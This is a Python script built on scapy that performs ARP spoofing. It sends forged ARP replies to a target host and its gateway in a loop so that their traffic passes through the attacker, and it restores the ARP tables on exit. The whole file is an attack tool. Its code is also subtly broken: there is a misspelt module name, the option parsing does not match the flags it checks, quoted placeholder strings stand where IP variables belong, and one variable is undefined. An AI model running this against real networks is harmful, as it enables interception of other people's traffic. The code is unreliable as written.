#!/usr/bin/python3

import scapy.all as scapy
import time
import sys
import getopt



def main(argv):
   target_ip = ''
   gateway_ip = ''
   try:
      opts, args = getopt.getopt(argv,"hi:o:",["tragetip=","gatewayip="])
   except getopt.GetoptError:
      print ('test.py -t <target IP> -g <Gateway IP>')
      sys.exit(2)
   for opt, arg in opts:
      if opt == '-h':
         print ('test.py -t <target IP> -g <Gateway IP>')
         sys.exit()
      elif opt in ("-t", "--tragetip"):
         target_ip = arg
      elif opt in ("-g", "--gatewayip"):
         gateway_ip = arg
   print ('Target IP: "', target_ip)
   print ('GatewayIP: "', gateway_ip)






def get_mac(ip):
    arp_request = scappy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op= 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
    scapy.send(packet,Verbose=False) 
    

def restore (destination_ip, source_ip):
    destination_mac = get_mac(destination_mac)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


if __name__ == "__main__":
   main(sys.argv[1:])


try:
    sent_packets_count = 0
    while True:
        spoof("target_ip","gateway_ip")
        spoof("gateway_ip","spoof_ip")

        sent_packets_count += 2

        print("\r[+] Sent spoof packets: " + str(sent_packets_count)),
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n Resetting Arp tables...\n")
    restore("target_ip", "gateway_ip")
    restore("gateway_ip","target_ip")
    print("Quitting...")

